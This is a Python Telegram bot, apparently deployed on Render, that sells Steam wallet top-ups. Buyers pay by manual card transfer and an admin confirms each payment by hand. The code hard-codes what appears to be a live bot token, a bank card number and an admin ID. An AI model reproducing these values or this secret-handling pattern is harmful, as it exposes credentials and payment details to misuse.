import asyncio
import os
import threading
from flask import Flask, request, jsonify
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.session.aiohttp import AiohttpSession

# --- НАСТРОЙКИ ---
TOKEN = '9179658337:AAG9Ia4fR0dZjvA7cVNX829brt48AfaOqhU'
CARD_NUMBER = "2200 3961 2634 2837"
ADMIN_ID = 8804452762 

# --- БОТ ---
bot = Bot(token=TOKEN)
dp = Dispatcher()

class SteamStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_login = State()

user_orders = {}

@dp.message(Command("start"))
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Brawl Stars", callback_data="brawl"), 
         InlineKeyboardButton(text="🎮 Steam", callback_data="steam")],
        [InlineKeyboardButton(text="🟥 Roblox", callback_data="roblox"), 
         InlineKeyboardButton(text="🔫 PUBG", callback_data="pubg")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ])
    await message.answer("👋 Привет! Выбери игру:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data == "steam")
async def steam_menu(callback: types.CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💵 100₽", callback_data="steam_100"),
         InlineKeyboardButton(text="💵 200₽", callback_data="steam_200")],
        [InlineKeyboardButton(text="💵 500₽", callback_data="steam_500"),
         InlineKeyboardButton(text="💵 1000₽", callback_data="steam_1000")],
        [InlineKeyboardButton(text="✍️ Своя сумма", callback_data="steam_custom")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back")]
    ])
    await callback.message.answer("Выбери сумму пополнения Steam:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data.startswith("steam_") and c.data != "steam_custom")
async def steam_amount_chosen(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    amount = int(callback.data.split("_")[1])
    final_price = int(amount * 1.15)
    await state.update_data(steam_amount=amount, final_price=final_price)
    await callback.message.answer(f"Ты выбрал {amount}₽. К оплате: {final_price}₽.\nВведи логин Steam:")
    await state.set_state(SteamStates.waiting_for_login)

@dp.callback_query(lambda c: c.data == "steam_custom")
async def steam_custom(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введи сумму пополнения (только цифры):")
    await state.set_state(SteamStates.waiting_for_amount)

@dp.message(SteamStates.waiting_for_amount)
async def process_custom_amount(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введи только цифры.")
        return
    amount = int(message.text)
    final_price = int(amount * 1.15)
    await state.update_data(steam_amount=amount, final_price=final_price)
    await message.answer(f"Ты выбрал {amount}₽. К оплате: {final_price}₽.\nВведи логин Steam:")
    await state.set_state(SteamStates.waiting_for_login)

@dp.message(SteamStates.waiting_for_login)
async def process_login(message: types.Message, state: FSMContext):
    login = message.text.strip()
    data = await state.get_data()
    final_price = data.get('final_price')
    user_orders[message.from_user.id] = {"login": login, "price": final_price}
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="user_paid")]
    ])
    await message.answer(f"Переведи {final_price}₽ на карту:\n{CARD_NUMBER}\n\nПосле перевода нажми:", reply_markup=keyboard)
    await state.clear()

@dp.callback_query(lambda c: c.data == "user_paid")
async def user_paid(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer("⏳ Проверяем оплату...")
    order = user_orders.get(callback.from_user.id)
    if order:
        admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"admin_confirm_{callback.from_user.id}")],
            [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{callback.from_user.id}")]
        ])
        await bot.send_message(ADMIN_ID, f"💰 ОПЛАТА!\nКлиент: {callback.from_user.first_name}\nЛогин: {order['login']}\nСумма: {order['price']}₽", reply_markup=admin_keyboard)

@dp.callback_query(lambda c: c.data.startswith("admin_"))
async def admin_action(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Нет прав.", show_alert=True)
        return
    parts = callback.data.split("_")
    action, user_id = parts[1], int(parts[2])
    if action == "confirm":
        await bot.send_message(user_id, "✅ Оплата прошла! Деньги зачислены на Steam.")
        await callback.message.edit_text("✅ Подтверждено.")
    else:
        await bot.send_message(user_id, "❌ Оплата не найдена. Напиши в поддержку.")
        await callback.message.edit_text("❌ Отклонено.")

@dp.callback_query(lambda c: c.data in ["brawl", "roblox", "pubg"])
async def other_games(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer("Скоро добавим!")

@dp.callback_query(lambda c: c.data == "support")
async def support(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer("🆘 Поддержка: @Fatty_Jerry")

@dp.callback_query(lambda c: c.data == "back")
async def back(callback: types.CallbackQuery):
    await callback.answer()
    await callback.message.answer("Выбери игру:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Brawl Stars", callback_data="brawl"), InlineKeyboardButton(text="🎮 Steam", callback_data="steam")],
        [InlineKeyboardButton(text="🟥 Roblox", callback_data="roblox"), InlineKeyboardButton(text="🔫 PUBG", callback_data="pubg")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ]))

# --- FLASK СЕРВЕР ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running"

@app.route('/webhook', methods=['POST'])
def webhook():
    return jsonify({"status": "success"}), 200

# --- ЗАПУСК ---
def run_flask():
    # Запускаем Flask на порту, который даст Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

async def main():
    print("Bot is starting...")
    # Запускаем Flask в отдельном потоке, чтобы он не мешал боту
    threading.Thread(target=run_flask, daemon=True).start()
    # Запускаем бота в главном потоке
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
